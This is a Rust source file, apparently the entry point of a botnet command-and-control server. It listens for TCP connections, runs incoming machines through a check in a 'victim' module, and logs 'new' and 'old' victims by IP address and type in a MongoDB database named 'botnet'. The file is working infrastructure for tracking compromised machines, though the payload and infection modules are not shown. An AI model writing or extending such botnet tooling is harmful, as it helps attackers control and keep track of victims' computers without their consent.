mod tracker;
mod victim;

#[macro_use]
extern crate log;

use std::{net::SocketAddr, env};
use tokio::net::TcpListener;

use mongodb::{options::ClientOptions, Client, Collection};
use mongodb::bson::doc;

use victim::{VictimDb, Victim};

#[tokio::main]
async fn main() {
    if env::var("RUST_LOG").is_err() {
        env::set_var("RUST_LOG", "debug");
    }
    env_logger::init();
    let listener = TcpListener::bind("192.168.0.12:9570").await.unwrap();
    let options = ClientOptions::parse("mongodb://127.0.0.1:27017/").await.unwrap();
    let client = Client::with_options(options).unwrap();

    info!("Server started");
    loop {
        let (stream, addr) = listener.accept().await.unwrap();

        info!("Connection established");
        let client = client.clone();
        tokio::spawn(async move {
            let victims_collection = client.database("botnet").collection::<VictimDb>("victims");
            let victim = victim::check_connection(stream, &addr).await;
            if let Some(victim) = victim {
                insert_victim_db(victim, &addr, victims_collection).await;
            } else {
                info!("{} tried to establish a connection but failed the test", addr.ip().to_string());
            }
        });
    }
}

async fn insert_victim_db(victim: Victim, addr: &SocketAddr, victims_collection: Collection<VictimDb>) {
    let filter = doc! { "ip": addr.ip().to_string() };
    let find_victim = victims_collection.find_one(filter, None).await;

    if let Err(err) = find_victim {
        error!("Error while trying to find a victim on the collection: {}", err);
        return;
    }
    let find_victim = find_victim.unwrap();
    if find_victim.is_none() {
        if let Err(err) = victims_collection.insert_one(VictimDb { ip: addr.ip().to_string(), victim_type: victim.victim_type }, None).await {
            error!("Failed to insert in the database : {}", err);
        } else {
            info!("A new victim has been inserted in the database, ip: {}, mode: {}", addr.ip().to_string(), victim.victim_type);
        }
    } else {
        info!("An old victim connected to the server, ip: {} mode: {}", addr.ip().to_string(), victim.victim_type);
    }
}
